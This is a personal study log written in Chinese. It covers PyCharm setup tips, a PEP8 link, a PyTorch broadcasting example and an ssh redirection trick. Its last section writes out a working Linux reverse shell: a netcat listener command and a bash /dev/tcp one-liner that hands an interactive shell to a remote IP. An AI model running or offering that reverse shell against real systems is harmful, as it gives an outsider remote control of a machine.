# 学习python日志
## 1.pycharm无法使用中文输入法解决办法
pycharm顶部菜单栏选择File---Settings---Plugins,查找安装choose runtime.程序主界面用快捷键Ctrl + Shift + A调出对话框，输入'choose runtime',在choose runtime下拉列表选择安装一个jbsdk安装包。重启ok。
## 2.pycharm有关字体排版问题
如果新环境包字体排版过于紧凑，重新调节字体设置。选择File---Settings---Editor---Font，选择字体型号，大小，行距。
## 3.python 代码书写规范: PEP8 编码规范
[python官方原文](https://legacy.python.org/dev/peps/pep-0008/)
[中文翻译版](https://blog.csdn.net/ratsniper/article/details/78954852)
## 4.数组的广播机制
a = torch.tensor([1,2,3,4])   b = torch.tensor([[100],[200]])    
计算a+b :    
a = [[1,2,3,4],[1,2,3,4]]     b = [[100,100,100,100],[200,200,200,200]]   

a+b = [[101,102,103,104],[201,202,203,204]]
## 5.linux ssh的一个特殊用法   

在远端系统中执行shell(例如ls) 命令， 并把命令输出重定向到本地系统中的一个文件里面   

ssh username@192.168.1.2 'ls /home/' > ./remote-sysinfo.txt    文件保存本地    

ssh username@192.168.1.2 'ls /home/ > ./remote-sysinfo.txt‘    文件保存远端    
## linux反弹shell
控制端开启端口监听：nc -l 3232      

被控端执行命令：bash -i  >& /dev/tcp/192.168.1.3/3232 0>&1  2>&1   被控端shell回显到控制端    
